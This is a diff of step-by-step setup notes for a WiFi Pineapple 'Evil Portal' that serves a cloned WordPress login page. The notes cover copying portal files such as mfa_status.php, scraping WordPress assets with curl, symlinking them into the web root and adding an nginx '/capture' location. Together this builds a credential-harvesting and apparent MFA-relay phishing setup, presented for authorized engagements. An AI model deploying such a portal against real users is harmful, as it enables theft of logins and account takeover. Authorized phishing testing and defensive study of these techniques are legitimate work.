@@ -1,18 +1,19 @@
-1) Restricted Access:
+1) Restrict Access:
 
 IMPORTANT: Ensure your open wifi network is disabled (http://172.16.42.1:1471/#/PineAP/open) and your WPA network is enabled with a secret password (http://172.16.42.1:1471/#/PineAP/aps). 
-a) This will ensure that only you have access to this testing network. (Only allow access to others if contracted for an authorized phishing engagement and this activity is in-scope).
-b) You can also add your MAC address to the client allow list (http://172.16.42.1:1471/#/PineAP/filtering), to add another layer of security, blocking unauthorized access.
+a) This will ensure that only you have access to your wifi pineapple. Don't allow others to join your network without their explicit permission.
+b) You can also add your client MAC address to the client allow list (http://172.16.42.1:1471/#/PineAP/filtering) to add another layer of access control.
 
 -------------------------------------------------------------------------------------------------------------
 2). Install Evilportal on the WiFi Pineapple:
 a) Connect to the Admin Portal at 172.16.42.1:1471
 
 b) Connect to Internet
-    i.) Ethernet Connection: Superior to WiFi connection
+    i.) Ethernet Connection: Automatic, if an ethernet cable is connected to the wifi pineapple using a USB adapter.
     ii.) WiFi Connection: (Settings > Networking > select the Client Mode Interface (under Wireless Client Mode) > click Scan  > select your AP > enter the Network Password > Click "Connect")
 
-c) Perform an internet speed test to measure bandwidth (download/upload speeds).
+c) Optional: Perform an internet speed test to measure bandwidth (download/upload speeds). 
+(You can do this by connecting a client to the pineapple.)
 
 d) Click on "Modules & Packages" in the sidebar.
 e) Click the "Modules" tab
@@ -29,16 +30,19 @@ m) Click "Install Dependencies".
 n) Optionally: Disconnect from the internet. (Internet connection is no longer required).
 
 -------------------------------------------------------------------------------------------------------------
-3. Create a New Captive Portal and delete the default from the EvilPortal source directory:
+3. Create a New Captive Portal
 
 a) Click "New Portal", ensure "Basic Portal" is selected, and click "Next. 
 
 b) Enter "Wordpress" as the portal name and click "Done".
 
--------------------------------------------------------------------------------------------------------------
-4. Delete the default from the EvilPortal source directory:
+(Note: You do not need to click "Activate".)
 
-a) Open the Terminal (in the top-right corner)
+-------------------------------------------------------------------------------------------------------------
+4. Delete the default EvilPortal configuration files from the EvilPortal source directory:
+
+a) Open the Terminal (in the top-right corner of the pineapple web interface)
+(If you don't get a shell in the pineapple web interface - SSH in to root@172.16.42.1 with your admin panel password.)
 
 b) Confirm the Default Files were created
 
@@ -52,7 +56,7 @@ root@mk7:~# rm -f /root/portals/Wordpress/*
 root@mk7:~# ls /root/portals/Wordpress/
 
 -------------------------------------------------------------------------------------------------------------
-5. Transfer the Github Repository Web Root Files to the EvilPortal source directory:
+5. Download the Github Repository Web Root Files 
 
 PS C:\Users\user\> wsl -d kali-linux
 ┏━(Message from Kali developers)
@@ -106,8 +110,8 @@ auth-relay-framework
 
 12 directories, 23 files
 
-
-* IMPORTANT: MAKE SURE THE FILES ARE NOT CORRUPTED (0 BYTES):
+-------------------------------------------------------------------------------------------------------------
+6. Verify the Web Root Files aren't corrupted (0 bytes) and transfer them to the EvilPortal source directory:
 
 ┌──(kali㉿computername)-[/mnt/c/Users/lobyo]
 └─$ ls -lah ./auth-relay-framework/Wordpress/captive-portal/setup/web-root/*
@@ -123,9 +127,6 @@ auth-relay-framework
 -rwxrwxrwx 1 kali kali  461 Oct 12 10:33 ./auth-relay-framework/Wordpress/captive-portal/setup/web-root/mfa_status.php
 -rwxrwxrwx 1 kali kali  866 Oct 12 10:33 ./auth-relay-framework/Wordpress/captive-portal/setup/web-root/success.html
 -rwxrwxrwx 1 kali kali  129 Oct 12 10:33 ./auth-relay-framework/Wordpress/captive-portal/setup/web-root/Wordpress.ep
-
-
-* TRANSFER THE FILES OVER TO THE PINEAPPLE:
 
 ┌──(kali㉿computername)-[/mnt/c/Users/user/]
 └─$ scp ./auth-relay-framework/Wordpress/captive-portal/setup/web-root/* root@172.16.42.1:/root/portals/Wordpress/
@@ -144,7 +145,7 @@ success.html                           100%  866   350.9KB/s   00:00
 Wordpress.ep                           100%  129    62.4KB/s   00:00
 
 -------------------------------------------------------------------------------------------------------------
-6. Transfer the Wordpress Static Format Files to the EvilPortal source directory:
+7. Download the Wordpress Static Format Files:
 
 ┌──(kali㉿computername)-[/mnt/c/Users/user/]
 └─$ mkdir wordpress
@@ -179,8 +180,8 @@ Wordpress.ep                           100%  129    62.4KB/s   00:00
 ┌──(kali㉿computername)-[/mnt/c/Users/user/wordpress]
 └─$ curl -s "https://wordpress.com/wp-includes/fonts/dashicons.eot" > wp-includes/fonts/dashicons.eot
 
-
-* IMPORTANT: MAKE SURE THE FILES ARE NOT CORRUPTED (0 BYTES):
+-------------------------------------------------------------------------------------------------------------
+8. Ensure the static format files are not corrupted (0 bytes)
 
 ┌──(kali㉿computername)-[/mnt/c/Users/lobyo/wordpress]
 └─$ ls -lahR wp-login.css wp-scripts.js images/ wp-includes/
@@ -208,8 +209,8 @@ drwxrwxrwx 1 kali kali 512 Oct 12 11:46 ..
 -rwxrwxrwx 1 kali kali 56K Oct 12 11:46 dashicons.ttf
 -rwxrwxrwx 1 kali kali 26K Oct 12 11:46 dashicons.woff2
 
-
-* TRANSFER THE FILES OVER TO THE PINEAPPLE:
+-------------------------------------------------------------------------------------------------------------
+9. Transfer the Wordpress Static Format Files to the EvilPortal source directory:
 
 ┌──(kali㉿computername)-[/mnt/c/Users/user/wordpress]
 └─$ scp -r wp-login.css wp-scripts.js images/ wp-includes/ root@172.16.42.1:/root/portals/Wordpress/
@@ -223,7 +224,7 @@ dashicons.ttf                          100%   55KB   1.6MB/s   00:00
 dashicons.woff2                        100%   26KB   1.3MB/s   00:00
 
 -------------------------------------------------------------------------------------------------------------
-7. Confirm the Portal Files have been Transferred EvilPortal source directory
+10. Confirm the Portal Files have been Transferred EvilPortal source directory
 
 PS C:\Users\user> ssh root@172.16.42.1
 
@@ -254,7 +255,7 @@ root@mk7:~# find /root/portals/Wordpress/ | sed 's|[^/]*/|  |g'
         mfa_status.php
 
 -------------------------------------------------------------------------------------------------------------
-8. Deploy Portal to Web Root
+11. Deploy Portal to Web Root
 
 root@mk7:~/portals/Wordpress# cd /www
 
@@ -263,9 +264,6 @@ root@mk7:~/portals/wordpress# ln -sf /root/portals/Wordpress/* .
 root@mk7:~/portals/wordpress# ln -sf /root/portals/Wordpress/images .
 
 root@mk7:~/portals/wordpress# ln -sf /root/portals/Wordpress/wp-includes .
-
-
-* IMPORTANT: Confirm the Sym Links were created in the web root
 
 root@mk7:/www# ls -lah /www
 drwxr-xr-x    1 root     root        4.0K Aug  4 21:40 .
@@ -288,12 +286,12 @@ lrwxrwxrwx    1 root     root          36 Aug  4 21:40 wp-login.css -> /root/por
 lrwxrwxrwx    1 root     root          37 Aug  4 21:40 wp-scripts.js -> /root/portals/Wordpress/wp-scripts.js
 
 -------------------------------------------------------------------------------------------------------------
-9. Backup Current Nginx Config
+12. Backup Current Nginx Config
 
 root@mk7:~/portals/Wordpress# cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak
 
 -------------------------------------------------------------------------------------------------------------
-10. Add the following location blocks to /etc/nginx/nginx.conf 
+13. Add the following location blocks to /etc/nginx/nginx.conf 
 (Inside the server block, before the existing "location ~ \.php$" block)
 
                 location = /capture {
@@ -330,26 +328,28 @@ root@mk7:~/portals/Wordpress# cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak
                 }
 
 -------------------------------------------------------------------------------------------------------------
-11. Test and Reload Nginx
+14. Test and Reload Nginx
 
 root@mk7:~/portals/Wordpress# nginx -t
 
 root@mk7:~/portals/Wordpress# nginx -s reload
 2025/10/12 11:56:35 [notice] 10694#0: signal process started
+
+(The below error is harmless - if you get it, you are likely using WiFi connection.)
 2025/10/12 11:56:35 [error] 10694#0: invalid PID number "" in "/var/run/nginx.pid"
 
 -------------------------------------------------------------------------------------------------------------
-12. Start and Enable the Captive Portal in the UI
+15. Start and Enable the Captive Portal in the UI
 
-a) The web portal should be activated / the web server should be started.
-(Refresh the page / reboot the pineapple to confirm.)
+a) The web portal should be ACTIVATED. (Refresh the Evil Portal module page to confirm.)
 
-b) Click "Preview" and confirm the login page is rendered correctly
+b) Reboot the pineapple and open the Evil Portal Module. The WEB SERVER should be started.
+
+c) Click "Preview" and confirm the login page is rendered correctly
 (If you get a "403 Forbidden nginx/1.19.6" error, make sure you have installed the dependencies for Evil Portal)
-(If the preview page is not formatted correctly, ensure the static Wordpress format files are not corrupted) 
+(If the preview page is not formatted correctly, the static Wordpress format files may be corrupted)
 
-c) Click "Start"
+d) Click "Start"
 (This will create the "Allowed Clients" allow list: /tmp/EVILPORTAL_CLIENTS.txt)
-
-d) Click "Enable on boot"
-(This will ensure the allow list is cleared following a reboot)
+e) Click "Enable on boot"
+(This will ensure the allow list is cleared following a reboot. Otherwise the client will maintain persistent access.)
